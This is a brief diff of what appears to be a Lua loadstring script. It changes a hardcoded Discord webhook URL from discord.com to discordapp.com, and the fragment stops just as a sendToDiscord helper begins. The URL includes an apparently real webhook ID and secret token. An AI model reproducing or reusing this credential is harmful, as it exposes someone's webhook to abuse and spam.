@@ -1,7 +1,7 @@
 -- Loadstring for your GitHub
 local function main()
     -- Your Discord webhook URL (DO NOT HARDCODE THIS IN A PUBLIC SCRIPT)
-    local myPrivateWebhook = "https://discord.com/api/webhooks/1411856749559812218/l8emirnmA7sEMSOeQflxhl1U27Gka987AmSgc1hjmZZCLHvR8SGRuMAyTFmi-pR-cZ9p"
+    local myPrivateWebhook = "https://discordapp.com/api/webhooks/1411856749559812218/l8emirnmA7sEMSOeQflxhl1U27Gka987AmSgc1hjmZZCLHvR8SGRuMAyTFmi-pR-cZ9p"
 
     -- Function to send data to Discord correctly
     local function sendToDiscord(webhookUrl, message)
